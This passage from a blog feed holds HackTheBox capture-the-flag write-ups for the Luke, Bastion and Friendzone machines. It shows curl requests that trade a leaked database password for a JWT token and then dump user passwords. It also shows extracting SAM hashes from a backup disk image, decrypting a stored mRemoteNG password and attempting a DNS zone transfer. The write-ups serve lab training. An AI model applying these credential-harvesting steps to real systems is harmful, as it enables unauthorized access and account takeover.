&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;The SSH service isn&#x27;t useful to us right now, we just keep that in mind that we have a service that we can try it on once we enumerate the other services for credentials.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Enumerating port 80 showed up a bootstrap page that doesn&#x27;t have any useful links to administration panels or hints of what CMS it uses besides bootstrap. I began enumerating the port 80 and found this link: &lt;a href=&quot;http:&#x2F;&#x2F;luke&#x2F;config.php&quot;&gt;http:&#x2F;&#x2F;luke&#x2F;config.php&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;$dbHost = &amp;#39;localhost&amp;#39;; $dbUsername = &amp;#39;root&amp;#39;; $dbPassword = &amp;#39;Zk6heYCyv6ZE9Xcg&amp;#39;; $db = &amp;quot;login&amp;quot;; $conn = new mysqli($dbHost, $dbUsername, $dbPassword,$db) or die(&amp;quot;Connect failed: %s\n&amp;quot;. $conn -&amp;gt; error);
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Not sure what to do with this information yet, I&#x27;ll keep this aside and keep enumerating the other services.&lt;&#x2F;p&gt;
&lt;p&gt;Another interesting link came up in the dirbuster searches: &lt;a href=&quot;http:&#x2F;&#x2F;luke&#x2F;package.json&quot;&gt;http:&#x2F;&#x2F;luke&#x2F;package.json&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;This JSON file tells us that Bootstrap 4.1.2 is most likely installed. I&#x27;ll keep this aside just in case I could search for exploits against it.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-luke&#x2F;htb-luke-packagejson.png&quot; alt=&quot;htb-luke-packagejson&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Enumerating port 3000 shows it&#x27;s running some sort of json service as it replies back with an HTTP request that looks like this:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;{&amp;quot;success&amp;quot;:false,&amp;quot;message&amp;quot;:&amp;quot;Auth token is not supplied&amp;quot;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;A quick Google search that this message is a JWT Token authentication service. I&#x27;ll keep this aside once again and finish up my enumeration process to see the bigger picture of what this machine is about. Gobuster also showed there is a directory named &lt;code&gt;&#x2F;login&lt;&#x2F;code&gt; and &lt;code&gt;&#x2F;users&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Enumerating port 8000 shows it&#x27;s running a platform called Ajenti. A quick Google search shows it&#x27;s a platform made for managing a server. I think this is a potential entry to gain access to what I need to gain user land. I tried the basic possible login and passwords but no luck. Looking for possible exploits only shows a viable XSS exploit but requires that you need to log into Ajenti first.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Circling back to what we have found so far, the JWT Token page must be related to generating a password I would assume.&lt;&#x2F;p&gt;
&lt;p&gt;I don&#x27;t know what JWT Token was until I was working on this machine. A quick Google search showed a Medium article to show you how to create a POST request to generate a token and GET request with the authorized token to obtain more information.&lt;&#x2F;p&gt;
&lt;p&gt;After some trial and error, here is my working POST request to obtain the JWT Token using cURL:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;curl --header &amp;quot;Content-Type: application&#x2F;json&amp;quot; --request POST --data &amp;#39;{&amp;quot;password&amp;quot;:&amp;quot;Zk6heYCyv6ZE9Xcg&amp;quot;, &amp;quot;username&amp;quot;:&amp;quot;admin&amp;quot;}&amp;#39; http:&#x2F;&#x2F;luke:3000&#x2F;login
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;The server response was a success!&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;{&amp;quot;success&amp;quot;:true,&amp;quot;message&amp;quot;:&amp;quot;Authentication successful!&amp;quot;,&amp;quot;token&amp;quot;:&amp;quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTYxNDA1NDQxLCJleHAiOjE1NjE0OTE4NDF9.kMu4ZFovwboGK0X348oz52Fwa_YXY7tKOMoRr8LbU8Y&amp;quot;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;One thing to note about the cURL command is that I had to change the username from root to admin to get a response. This isn&#x27;t something I would have thought of and I got a hint from the Discord chat. Lesson learned to enumerate even these json-type services.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Now with this JWT Token in hand, what do we do with this? It&#x27;s time to craft a GET response and see what we can find out in the &#x2F;users directory that we found earlier.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;curl -X GET -H &amp;#39;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTYxNDA1ODg3LCJleHAiOjE1NjE0OTIyODd9.QBBrRf7x5MPx1GkcJRQZxtShmP9az9RpRWqQyq9VHzM&amp;#39; http:&#x2F;&#x2F;luke:3000&#x2F;users
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;The server responded with my request!&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;[{&amp;quot;ID&amp;quot;:&amp;quot;1&amp;quot;,&amp;quot;name&amp;quot;:&amp;quot;Admin&amp;quot;,&amp;quot;Role&amp;quot;:&amp;quot;Superuser&amp;quot;},{&amp;quot;ID&amp;quot;:&amp;quot;2&amp;quot;,&amp;quot;name&amp;quot;:&amp;quot;Derry&amp;quot;,&amp;quot;Role&amp;quot;:&amp;quot;Web Admin&amp;quot;},{&amp;quot;ID&amp;quot;:&amp;quot;3&amp;quot;,&amp;quot;name&amp;quot;:&amp;quot;Yuri&amp;quot;,&amp;quot;Role&amp;quot;:&amp;quot;Beta Tester&amp;quot;},{&amp;quot;ID&amp;quot;:&amp;quot;4&amp;quot;,&amp;quot;name&amp;quot;:&amp;quot;Dory&amp;quot;,&amp;quot;Role&amp;quot;:&amp;quot;Supporter&amp;quot;}]
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;This is surprising. I expected to generate a response with username and passwords but only showed username instead. If it&#x27;s one thing I learned from before, even these json-type services can be enumerated further. I tried to play around with the variables in the json response and see if I get a response.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;curl -X GET -H &amp;#39;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTYxNDA1ODg3LCJleHAiOjE1NjE0OTIyODd9.QBBrRf7x5MPx1GkcJRQZxtShmP9az9RpRWqQyq9VHzM&amp;#39; http:&#x2F;&#x2F;luke:3000&#x2F;users&#x2F;admin
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;And indeed I did so I proceed to enumerate all the users.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;{&amp;quot;name&amp;quot;:&amp;quot;Admin&amp;quot;,&amp;quot;password&amp;quot;:&amp;quot;WX5b7)&amp;gt;&#x2F;rp$U)FW&amp;quot;}
&lt;&#x2F;span&gt;&lt;span&gt;{&amp;quot;name&amp;quot;:&amp;quot;Derry&amp;quot;,&amp;quot;password&amp;quot;:&amp;quot;rZ86wwLvx7jUxtch&amp;quot;}
&lt;&#x2F;span&gt;&lt;span&gt;{&amp;quot;name&amp;quot;:&amp;quot;Yuri&amp;quot;,&amp;quot;password&amp;quot;:&amp;quot;bet@tester87&amp;quot;}
&lt;&#x2F;span&gt;&lt;span&gt;{&amp;quot;name&amp;quot;:&amp;quot;Dory&amp;quot;,&amp;quot;password&amp;quot;:&amp;quot;5y:!xa=ybfe)&#x2F;QD&amp;quot;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Now that we have username and passwords, which services will allow me to login? Seeing that I found 3 places to login so far in port 22, 80, 8000, I tried those and failed. Wondering where if I missed something in my enumeration process and indeed I did. Don&#x27;t just rely on 1 tool to do all your scans as I did. I only used Gobuster for my enumeration process and I should have used dirbuster with recursive mode turned on. Once I did, it found a &lt;code&gt;&#x2F;management&lt;&#x2F;code&gt; folder in port 80.&lt;&#x2F;p&gt;
&lt;p&gt;The folder was protected by HTTP Basic Auth but was bypassed as I used Derry&#x27;s login. Once logged in, there are couple of files displayed but only the &lt;code&gt;config.json&lt;&#x2F;code&gt; file had interesting data.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;quot;users&amp;quot;: {
&lt;&#x2F;span&gt;&lt;span&gt;        &amp;quot;root&amp;quot;: {
&lt;&#x2F;span&gt;&lt;span&gt;            &amp;quot;configs&amp;quot;: {
&lt;&#x2F;span&gt;&lt;span&gt;                &amp;quot;ajenti.plugins.notepad.notepad.Notepad&amp;quot;: &amp;quot;{\&amp;quot;bookmarks\&amp;quot;: [], \&amp;quot;root\&amp;quot;: \&amp;quot;&#x2F;\&amp;quot;}&amp;quot;, 
&lt;&#x2F;span&gt;&lt;span&gt;                &amp;quot;ajenti.plugins.terminal.main.Terminals&amp;quot;: &amp;quot;{\&amp;quot;shell\&amp;quot;: \&amp;quot;sh -c $SHELL || sh\&amp;quot;}&amp;quot;, 
&lt;&#x2F;span&gt;&lt;span&gt;                &amp;quot;ajenti.plugins.elements.ipmap.ElementsIPMapper&amp;quot;: &amp;quot;{\&amp;quot;users\&amp;quot;: {}}&amp;quot;, 
&lt;&#x2F;span&gt;&lt;span&gt;                &amp;quot;ajenti.plugins.munin.client.MuninClient&amp;quot;: &amp;quot;{\&amp;quot;username\&amp;quot;: \&amp;quot;username\&amp;quot;, \&amp;quot;prefix\&amp;quot;: \&amp;quot;http:&#x2F;&#x2F;localhost:8080&#x2F;munin\&amp;quot;, \&amp;quot;password\&amp;quot;: \&amp;quot;123\&amp;quot;}&amp;quot;, 
&lt;&#x2F;span&gt;&lt;span&gt;                &amp;quot;ajenti.plugins.dashboard.dash.Dash&amp;quot;: &amp;quot;{\&amp;quot;widgets\&amp;quot;: [{\&amp;quot;index\&amp;quot;: 0, \&amp;quot;config\&amp;quot;: null, \&amp;quot;container\&amp;quot;: \&amp;quot;1\&amp;quot;, \&amp;quot;class\&amp;quot;: \&amp;quot;ajenti.plugins.sensors.memory.MemoryWidget\&amp;quot;}, {\&amp;quot;index\&amp;quot;: 1, \&amp;quot;config\&amp;quot;: null, \&amp;quot;container\&amp;quot;: \&amp;quot;1\&amp;quot;, \&amp;quot;class\&amp;quot;: \&amp;quot;ajenti.plugins.sensors.memory.SwapWidget\&amp;quot;}, {\&amp;quot;index\&amp;quot;: 2, \&amp;quot;config\&amp;quot;: null, \&amp;quot;container\&amp;quot;: \&amp;quot;1\&amp;quot;, \&amp;quot;class\&amp;quot;: \&amp;quot;ajenti.plugins.dashboard.welcome.WelcomeWidget\&amp;quot;}, {\&amp;quot;index\&amp;quot;: 0, \&amp;quot;config\&amp;quot;: null, \&amp;quot;container\&amp;quot;: \&amp;quot;0\&amp;quot;, \&amp;quot;class\&amp;quot;: \&amp;quot;ajenti.plugins.sensors.uptime.UptimeWidget\&amp;quot;}, {\&amp;quot;index\&amp;quot;: 1, \&amp;quot;config\&amp;quot;: null, \&amp;quot;container\&amp;quot;: \&amp;quot;0\&amp;quot;, \&amp;quot;class\&amp;quot;: \&amp;quot;ajenti.plugins.power.power.PowerWidget\&amp;quot;}, {\&amp;quot;index\&amp;quot;: 2, \&amp;quot;config\&amp;quot;: null, \&amp;quot;container\&amp;quot;: \&amp;quot;0\&amp;quot;, \&amp;quot;class\&amp;quot;: \&amp;quot;ajenti.plugins.sensors.cpu.CPUWidget\&amp;quot;}]}&amp;quot;, 
&lt;&#x2F;span&gt;&lt;span&gt;                &amp;quot;ajenti.plugins.elements.shaper.main.Shaper&amp;quot;: &amp;quot;{\&amp;quot;rules\&amp;quot;: []}&amp;quot;, 
&lt;&#x2F;span&gt;&lt;span&gt;                &amp;quot;ajenti.plugins.ajenti_org.main.AjentiOrgReporter&amp;quot;: &amp;quot;{\&amp;quot;key\&amp;quot;: null}&amp;quot;, 
&lt;&#x2F;span&gt;&lt;span&gt;                &amp;quot;ajenti.plugins.logs.main.Logs&amp;quot;: &amp;quot;{\&amp;quot;root\&amp;quot;: \&amp;quot;&#x2F;var&#x2F;log\&amp;quot;}&amp;quot;, 
&lt;&#x2F;span&gt;&lt;span&gt;                &amp;quot;ajenti.plugins.mysql.api.MySQLDB&amp;quot;: &amp;quot;{\&amp;quot;password\&amp;quot;: \&amp;quot;\&amp;quot;, \&amp;quot;user\&amp;quot;: \&amp;quot;root\&amp;quot;, \&amp;quot;hostname\&amp;quot;: \&amp;quot;localhost\&amp;quot;}&amp;quot;, 
&lt;&#x2F;span&gt;&lt;span&gt;                &amp;quot;ajenti.plugins.fm.fm.FileManager&amp;quot;: &amp;quot;{\&amp;quot;root\&amp;quot;: \&amp;quot;&#x2F;\&amp;quot;}&amp;quot;, 
&lt;&#x2F;span&gt;&lt;span&gt;                &amp;quot;ajenti.plugins.tasks.manager.TaskManager&amp;quot;: &amp;quot;{\&amp;quot;task_definitions\&amp;quot;: []}&amp;quot;, 
&lt;&#x2F;span&gt;&lt;span&gt;                &amp;quot;ajenti.users.UserManager&amp;quot;: &amp;quot;{\&amp;quot;sync-provider\&amp;quot;: \&amp;quot;\&amp;quot;}&amp;quot;, 
&lt;&#x2F;span&gt;&lt;span&gt;                &amp;quot;ajenti.usersync.adsync.ActiveDirectorySyncProvider&amp;quot;: &amp;quot;{\&amp;quot;domain\&amp;quot;: \&amp;quot;DOMAIN\&amp;quot;, \&amp;quot;password\&amp;quot;: \&amp;quot;\&amp;quot;, \&amp;quot;user\&amp;quot;: \&amp;quot;Administrator\&amp;quot;, \&amp;quot;base\&amp;quot;: \&amp;quot;cn=Users,dc=DOMAIN\&amp;quot;, \&amp;quot;address\&amp;quot;: \&amp;quot;localhost\&amp;quot;}&amp;quot;, 
&lt;&#x2F;span&gt;&lt;span&gt;                &amp;quot;ajenti.plugins.elements.usermgr.ElementsUserManager&amp;quot;: &amp;quot;{\&amp;quot;groups\&amp;quot;: []}&amp;quot;, 
&lt;&#x2F;span&gt;&lt;span&gt;                &amp;quot;ajenti.plugins.elements.projects.main.ElementsProjectManager&amp;quot;: &amp;quot;{\&amp;quot;projects\&amp;quot;: \&amp;quot;KGxwMQou\\n\&amp;quot;}&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;            }, 
&lt;&#x2F;span&gt;&lt;span&gt;            &amp;quot;password&amp;quot;: &amp;quot;KpMasng6S5EtTy9Z&amp;quot;, 
&lt;&#x2F;span&gt;&lt;span&gt;            &amp;quot;permissions&amp;quot;: []
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;    }, 
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;quot;language&amp;quot;: &amp;quot;&amp;quot;, 
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;quot;bind&amp;quot;: {
&lt;&#x2F;span&gt;&lt;span&gt;        &amp;quot;host&amp;quot;: &amp;quot;0.0.0.0&amp;quot;, 
&lt;&#x2F;span&gt;&lt;span&gt;        &amp;quot;port&amp;quot;: 8000
&lt;&#x2F;span&gt;&lt;span&gt;    }, 
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;quot;enable_feedback&amp;quot;: true, 
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;quot;ssl&amp;quot;: {
&lt;&#x2F;span&gt;&lt;span&gt;        &amp;quot;enable&amp;quot;: false, 
&lt;&#x2F;span&gt;&lt;span&gt;        &amp;quot;certificate_path&amp;quot;: &amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;    }, 
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;quot;authentication&amp;quot;: true, 
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;quot;installation_id&amp;quot;: 12354
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;The config.json file contains a root and password. Now what do we do with this newly obtained credentials? I tried using it on the other login panels as we found earlier again. The root credentials was succcessful on port 8000, the Ajenti platform!&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Once logged in, I was looking for a possible way to read the flag such as an editor or something. Luckily, there is a File Manager tool that we can read the user flag and even root flag. That was too easy.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-luke&#x2F;htb-luke-rootfs.png&quot; alt=&quot;htb-luke-rootfs&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Bastion</title>
        <published>2019-09-07T00:00:00+00:00</published>
        <updated>2019-09-07T00:00:00+00:00</updated>
        <author>
          <name>John Tuyen</name>
        </author>
        <link rel="alternate" href="https://johntuyen.com/posts/htb-bastion/" type="text/html"/>
        <id>https://johntuyen.com/posts/htb-bastion/</id>
        
        <content type="html">&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;Initial scan show port 139 and 445 is open which means there might be an open SMB share available for mount.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;smbclient &#x2F;&#x2F;10.10.10.134&#x2F;Backups
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-bastion&#x2F;htb-bastion-smb-backups.png&quot; alt=&quot;htb-bastion-smb-backups&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;There are two .vhd files that could be useful for us. Instead of downloading it on our system, we can mount it directory using guestmount. This part could take awhile as the connection is slow.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;guestmount --add &#x2F;mnt&#x2F;test&#x2F;WindowsImageBackup&#x2F;L4mpje-PC&#x2F;Backup\ 2019-02-22\ 124351&#x2F;9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro &#x2F;mnt&#x2F;vhd
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Now that we have the .vhd file mounted, we can proceed with using samdump and extract the SYSTEM and SAM hash and see if we can match the hash using hashkiller.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-bastion&#x2F;htb-bastion-samdump2.png&quot; alt=&quot;htb-bastion-samdump2.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;hashkiller.co.uk&lt;&#x2F;code&gt; matches a hash result that shows &lt;code&gt;bureaulampje&lt;&#x2F;code&gt; is the password for &lt;code&gt;L4mpje&lt;&#x2F;code&gt; user.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;*disabled* Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                     
&lt;&#x2F;span&gt;&lt;span&gt;*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                             
&lt;&#x2F;span&gt;&lt;span&gt;L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9 (bureaulampje):::
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Now if we &lt;code&gt;ssh&lt;&#x2F;code&gt; as the user, we should be able to retrieve the user flag&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;ssh L4mpje@10.10.10.134
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;h3 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;&#x2F;h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;A software located in Program Files stuck out like a sore thumb:&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-bastion&#x2F;htb-bastion-mremoteng.png&quot; alt=&quot;htb-bastion-mremoteng.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Further investigation showed there is a hidden &lt;code&gt;mRemoteNG&lt;&#x2F;code&gt; folder that contains the configuration file:&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-bastion&#x2F;htb-bastion-mremoteng-hidden.png&quot; alt=&quot;htb-bastion-mremoteng-hidden.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Google search shows that you can decrypt the password by using this tool on github: &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;kmahyyg&#x2F;mremoteng-decrypt&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;kmahyyg&#x2F;mremoteng-decrypt&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;python3 mremoteng_decrypt.py -s &amp;quot;aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt&#x2F;zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Password: thXLHM96BeKL0ER2
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-bastion&#x2F;htb-bastion-admin-pass.png&quot; alt=&quot;htb-bastion-admin-pass.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Now that we have decrypted the password, we should be able to log into as administrator and obtain root flag.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;ssh administrator@10.10.10.134
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Friendzone</title>
        <published>2019-07-11T00:00:00+00:00</published>
        <updated>2019-07-11T00:00:00+00:00</updated>
        <author>
          <name>John Tuyen</name>
        </author>
        <link rel="alternate" href="https://johntuyen.com/posts/htb-friendzone/" type="text/html"/>
        <id>https://johntuyen.com/posts/htb-friendzone/</id>
        
        <content type="html">&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;The initial &lt;code&gt;Nmap&lt;&#x2F;code&gt; scans shows the following ports opened:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;21, 22, 53, 80, 139, 443.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Lets start with port 80. The site displays a web page that says “Have you ever been friendzoned?” with an image. The source code doesn&#x27;t show much, it was coded with simple HTML tags.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;GoBuster&lt;&#x2F;code&gt; scans shows an accessible &lt;code&gt;robots.txt&lt;&#x2F;code&gt; and wordpress file and directory. &lt;code&gt;robots.txt&lt;&#x2F;code&gt; doesn&#x27;t contain anything besides “seriously?!”. The wordpress directory is blank and I began enumerating the directory to see if &lt;code&gt;gobuster&lt;&#x2F;code&gt; can find other hidden files&#x2F;directories.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;While &lt;code&gt;gobuster&lt;&#x2F;code&gt; is running, I&#x27;m moving on with enumerating port 53 which is a DNS service. With my limited experience with CTFs so far, I know that when port 53 is open for enumeration, a zone transfer command is required.&lt;&#x2F;p&gt;
&lt;p&gt;Before I begin running DNS commands to enumerate the service, I have to figure out what is the domain name I am targeting. On the main &lt;code&gt;index.html&lt;&#x2F;code&gt; page:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;Email us at: info@friendzoneportal.red
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;This means our target will be &lt;code&gt;friendzoneportal.red&lt;&#x2F;code&gt;. I&#x27;ll add it to our host file.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;10.10.10.123  friendzoneportal.red
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Use dig to see if zone transfer is vulnerable:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;dig axfr friendzoneportal.red @10.10.10.123
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
